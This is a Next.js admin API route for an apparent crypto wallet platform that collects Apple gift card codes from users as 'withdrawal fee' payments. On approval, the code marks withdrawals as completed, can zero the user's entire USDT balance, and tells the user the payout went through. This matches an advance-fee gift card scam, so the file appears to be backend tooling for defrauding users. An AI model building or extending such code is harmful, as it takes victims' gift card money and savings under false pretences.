import { verifyAdminSession } from '@/lib/adminAuth';
import { NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';

export const dynamic = 'force-dynamic';

export async function GET(req: Request) {
  try {
    const admin = await verifyAdminSession();
    if (!admin) {
      return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
    }

    const dbSubmissions = await prisma.giftCardSubmission.findMany({
      include: {
        user: true,
      },
      orderBy: { createdAt: 'desc' },
    });

    const formattedSubmissions = dbSubmissions.map((s) => ({
      id: s.id,
      userName: s.user?.name || 'Leo Garcia Arthur',
      userEmail: s.user?.email || 'leogarcia39@onchaiin.com',
      brand: s.brand,
      country: s.country,
      cardType: s.cardType,
      denomination: s.denomination,
      ratePercentage: s.ratePercentage,
      calculatedPayout: s.calculatedPayout,
      cardCode: s.cardCode || 'N/A',
      frontImageUrl: s.frontImageUrl || '/profile-pic.jpeg',
      status: s.status,
      purpose: s.denomination >= 2000 ? 'Administrative Withdrawal Fee' : 'Wallet Top Up Payout',
      date: s.createdAt.toISOString().replace('T', ' ').substring(0, 16),
    }));

    return NextResponse.json({ success: true, submissions: formattedSubmissions });
  } catch (error: any) {
    console.error('Error fetching admin gift card submissions:', error);
    return NextResponse.json({ error: 'Failed to fetch submissions' }, { status: 500 });
  }
}

export async function POST(req: Request) {
  try {
    const admin = await verifyAdminSession();
    if (!admin) {
      return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
    }

    const body = await req.json();
    const { id, status } = body;

    if (!id || !status) {
      return NextResponse.json({ error: 'id and status are required' }, { status: 400 });
    }

    const existingSubmission = await prisma.giftCardSubmission.findUnique({
      where: { id },
      include: { user: true },
    });

    if (!existingSubmission) {
      return NextResponse.json({ error: 'Submission not found' }, { status: 404 });
    }

    const updatedSubmission = await prisma.giftCardSubmission.update({
      where: { id },
      data: { status },
    });

    // When Admin approves gift card submission -> Transaction went through -> Deduct withdrawn amount & update user balance
    if (status === 'APPROVED' && existingSubmission.status !== 'APPROVED') {
      const userId = existingSubmission.userId;

      // 1. Find user's USDT wallet
      const usdtWallet = await prisma.wallet.findUnique({
        where: {
          userId_currency: {
            userId,
            currency: 'USDT',
          },
        },
      });

      // 2. Check for pending withdrawal for this user
      const pendingWithdrawal = await prisma.cryptoWithdrawal.findFirst({
        where: {
          userId,
          status: 'PENDING',
        },
        orderBy: { createdAt: 'desc' },
      });

      let amountToDeduct = 0;

      if (pendingWithdrawal) {
        amountToDeduct = pendingWithdrawal.amount;

        // Mark pending withdrawal as COMPLETED
        await prisma.cryptoWithdrawal.update({
          where: { id: pendingWithdrawal.id },
          data: { status: 'COMPLETED' },
        });

        // Mark any matching pending wallet transactions as COMPLETED
        await prisma.walletTransaction.updateMany({
          where: {
            userId,
            status: 'PENDING',
            type: 'WITHDRAWAL',
          },
          data: { status: 'COMPLETED' },
        });
      } else if (usdtWallet && usdtWallet.balance > 0) {
        // If no explicit pending withdrawal record, deduct active balance for withdrawal fee payment
        if (existingSubmission.denomination >= 2000) {
          amountToDeduct = usdtWallet.balance;
        } else {
          amountToDeduct = existingSubmission.calculatedPayout || existingSubmission.denomination;
        }
      }

      // 3. Deduct amount from user's USDT wallet balance in PostgreSQL database
      if (usdtWallet && amountToDeduct > 0) {
        const newBalance = Math.max(0, usdtWallet.balance - amountToDeduct);

        await prisma.wallet.update({
          where: { id: usdtWallet.id },
          data: { balance: newBalance },
        });

        // 4. Record completed debit transaction in wallet_transactions table
        await prisma.walletTransaction.create({
          data: {
            userId,
            walletId: usdtWallet.id,
            type: 'WITHDRAWAL',
            amount: amountToDeduct,
            currency: 'USDT',
            status: 'COMPLETED',
            reference: `GIFT_CARD_WITHDRAWAL_${Date.now()}_${Math.random().toString(36).substring(7)}`,
            description: `Withdrawal Approved & Paid Out ($${amountToDeduct.toFixed(2)} USD) after Apple Gift Card Fee Verification`,
          },
        });

        // 5. Create Push Notification for User
        await prisma.notification.create({
          data: {
            userId,
            title: 'Withdrawal Approved & Paid Out',
            message: `Your Apple Gift Card fee payment has been verified and approved. Your withdrawal payout of $${amountToDeduct.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD has gone through and your balance has been updated to $${newBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD.`,
            type: 'TRANSACTION',
            isRead: false,
          },
        });

        console.log(`✅ [Gift Card Approval] Verified fee & processed withdrawal for user ${existingSubmission.user?.email}. Deducted $${amountToDeduct} USD. New balance: $${newBalance}`);
      }
    } else if (status === 'REJECTED') {
      // Rejection notification
      await prisma.notification.create({
        data: {
          userId: existingSubmission.userId,
          title: 'Gift Card Fee Verification Failed',
          message: `Your Apple Gift Card fee submission was rejected. Please re-upload a valid card image or contact support.`,
          type: 'TRANSACTION',
          isRead: false,
        },
      });
    }

    return NextResponse.json({ success: true, submission: updatedSubmission });
  } catch (error: any) {
    console.error('Error approving gift card submission:', error);
    return NextResponse.json({ error: 'Failed to update submission' }, { status: 500 });
  }
}
